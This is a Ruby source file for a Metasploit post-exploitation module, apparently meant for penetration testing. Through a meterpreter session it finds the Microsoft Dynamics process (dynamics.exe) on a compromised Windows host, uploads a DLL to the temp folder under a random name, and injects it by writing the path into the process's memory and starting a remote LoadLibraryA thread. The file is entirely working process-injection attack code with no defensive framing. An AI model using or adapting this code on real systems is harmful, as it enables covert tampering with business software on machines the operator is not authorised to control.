##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# web site for more information on licensing and terms of use.
#   http://metasploit.com/
##

require 'msf/core'
require 'rex/text'

class Metasploit3 < Msf::Post

	def initialize(info={})
		super(update_info(info,
			'Name'           => 'Project Mayhem DLL Installer',
			'Description'    => %q{
				Inject the project mayhem DLL into a Microsoft Dynamics process.
			},
			'Author'        => 'Spencer McIntyre',
			'License'       => MSF_LICENSE,
			'Platform'      => [ 'win' ],
			'SessionTypes'  => [ 'meterpreter' ]
		))
	end


	def run
		dynamics_pid = nil
		session.sys.process.get_processes().each do |p|
			if p['name'].downcase == 'dynamics.exe'
				dynamics_pid = p['pid']
			end
		end
		if dynamics_pid.nil?
			print_error("Could not locate the Dynamics process")
			return
		end
		print_status("Located Dynamics running in PID: #{dynamics_pid}")

		dynamics_h = session.sys.process.open(dynamics_pid)
		print_status("Opened a handle to Dynamics")

		tmp_path = session.fs.file.expand_path("%TEMP%")
		dll_name = "project_mayhem.dll"
		remote_dll_path = "#{tmp_path}\\#{Rex::Text.rand_text_alphanumeric(4 + rand(6))}.dll"
		vprint_status("Uploading DLL To: #{remote_dll_path}")
		session.fs.file.upload_file(remote_dll_path, File.join(Msf::Config.install_root, "data", "post", "project_mayhem.dll"))

		print_status("Injecting the DLL into Dynamics")
		kernel32_h = session.railgun.kernel32.GetModuleHandleA("kernel32.dll")['return']
		loadlibrarya_h = session.railgun.kernel32.GetProcAddress(kernel32_h, "LoadLibraryA")['return']

		mem = dynamics_h.memory.allocate(remote_dll_path.length + (remote_dll_path.length % 1024))
		dynamics_h.memory.write(mem, remote_dll_path)
		dynamics_h.thread.create(loadlibrarya_h, mem)
	end
end
